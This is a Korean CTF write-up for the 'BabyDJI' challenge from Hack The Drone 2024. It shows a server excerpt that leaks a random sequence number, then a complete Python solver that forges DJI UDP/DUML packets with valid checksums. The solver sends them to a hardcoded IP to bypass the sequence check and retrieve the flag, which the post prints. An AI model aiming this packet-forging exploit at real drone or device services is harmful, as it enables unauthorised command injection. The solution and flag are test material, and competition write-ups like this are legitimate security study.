---
layout: post
title: BabyDJI
date: April 11, 2024
categories: CTF
comment: true
---
**상위 포스트 -** [Hack The Drone 2024](/2024-09/Hack_The_Drone)

아래는 [server.py](http://server.py)의 일부입니다.

```python
def handshake_by_rc(): # 10초에 한번씩 global 변수 g_seq 값이 랜덤하게 바뀜
    global g_seq
    while True:
        g_seq = random.randint(1, 65535)
        time.sleep(10)

def parse_cmd(data):
    udt_packet = DJIUDPPacket(data)
    assert udt_packet.packet_type == 0x05

    if udt_packet.sequence_number != g_seq + 1:
        return struct.pack('<HH', g_seq, udt_packet.packet_length)

    packet = CommandDataPacket(data)
    assert all([packet.payload.cmd_set == 1, packet.payload.cmd_id == 1, packet.payload.cmd_payload == b'GET FLAG'])
    return FLAG
```

`g_seq`를 랜덤하게 10초마다 랜덤하게 설정 후 들어온 패킷의 DJIUPD sequence_num과 검증합니다.

이 검증을 통과하지 못한다고 하더라도, `g_seq` 값을 다시 보내 줍니다.

그래서 `DJIUPD`의 포맷을 맞추어 패킷을 보내서 `g_seq`값을 얻은 뒤, `DUMLPacket` 클래스의 포맷까지 같이 맞춰서 payload에 `GET FLAG`를 태워 보내면 flag를 얻을 수 있습니다.

solver.py

```python
from crc import calc_hdr_checksum, calc_checksum
import struct
import socket
import threading
import time

class DUMLPacket:
    def __init__(self, packet):        
        self.packet = packet
        self.parse_header()
        self.parse_transit()
        self.parse_command()
        self.parse_payload_crc()

    def parse_header(self):
        self.magic = self.packet[0]
        self.length = self.packet[1] | ((self.packet[2] & 0x03) << 8)
        self.version = self.packet[2] >> 2
        self.crc8 = self.packet[3]

        assert self.magic == 0x55, "Invalid magic byte"
        print(len(self.packet), self.length)
        assert self.length == len(self.packet), "Invalid length"

        calculated_crc8 = calc_hdr_checksum(0x77, self.packet[:3], 3)
        assert self.crc8 == calculated_crc8, f"CRC8 mismatch: expected {hex(calculated_crc8)}, got {hex(self.crc8)}"

    def parse_transit(self):
        self.src_id = (self.packet[4] & 0xe0) >> 5
        self.src_type = self.packet[4] & 0x1F
        self.dest_id = (self.packet[5] & 0xe0) >> 5
        self.dest_type = self.packet[5] & 0x1F
        self.counter = ((self.packet[7] & 0xFF) << 8) | (self.packet[6] & 0xFF)

    def parse_command(self):
        self.cmd_type = self.packet[8] >> 7
        self.ack_type = (self.packet[8] >> 5) & 0x03
        self.encrypt = self.packet[8] & 0x07
        self.cmd_set = self.packet[9]
        self.cmd_id = self.packet[10]

    def parse_payload_crc(self):
        self.cmd_payload = self.packet[11:-2]

        whole_packet = self.packet[:-2]
        self.crc16 = struct.unpack_from("<H", self.packet, len(whole_packet))[0]
        calculated_crc16 = calc_checksum(whole_packet, len(whole_packet))
        assert self.crc16 == calculated_crc16, f"CRC16 mismatch: expected {hex(calculated_crc16)}, got {hex(self.crc16)}"

class DJIUDPPacket:
    def __init__(self, data):
        self.data = data
        self.parse_packet()

    def parse_packet(self):
        self.packet_length, self.sequence_number, self.packet_type = struct.unpack('<HHB', self.data[:5])
        self.packet_length = self.packet_length ^ (1 << 15)
        self.payload = self.data[5:self.packet_length]
        assert self.packet_length == len(self.data), "Invalid length"

class CommandDataPacket(DJIUDPPacket):
    def __init__(self, data):
        super().__init__(data)
        self.parse_command_data()

    def parse_command_data(self):
        self.payload = DUMLPacket(self.payload)

if __name__ == "__main__":
    dumlpacket = b""
    duml_magic = 0x55
    duml_length = (6 + len("GET FLAG") + 5) + 2
    duml_version = 0

    dumlpacket += duml_magic.to_bytes(1, "big")
    dumlpacket += duml_length.to_bytes(1, "big")
    dumlpacket += (duml_version << 2).to_bytes(1, "big")

    calculated_crc8 = calc_hdr_checksum(0x77, dumlpacket[:3], 3)
    dumlpacket += calculated_crc8.to_bytes(1, "big")

    dumlpacket += b"\x00\x00\x00\x00"
    dumlpacket += b"\x00\x01\x01"
    dumlpacket += b"GET FLAG"

    calculated_crc16 = calc_checksum(dumlpacket, len(dumlpacket))
    dumlpacket += calculated_crc16.to_bytes(2, "little")

    dji_len = (len(dumlpacket) + 5) ^ (1 << 15)
    dji_seq = 0
    dji_type = 0x05
    djipacket = struct.pack('<HHB', dji_len, dji_seq, dji_type)

    packet = djipacket + dumlpacket

    host = "15.164.114.238"
    port = 9003
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (host, port))

    data, addr = sock.recvfrom(1024)
    print(data)
    seq = int.from_bytes(data[:2], "little")
    dji_seq = seq + 1
    djipacket = struct.pack('<HHB', dji_len, dji_seq, dji_type)
    packet = djipacket + dumlpacket

    udp_packet = DJIUDPPacket(packet)
    print(udp_packet.packet_type)
    pk = CommandDataPacket(packet)
    print(pk.payload.cmd_set)
    print(pk.payload.cmd_id)
    print(pk.payload.cmd_payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (host, port))
    data, addr = sock.recvfrom(1024)
    print(data)
```

flag: `HTD{NOw_1t_I5_tiME_TO_Study_Th3_dJ1_protoCO1s}`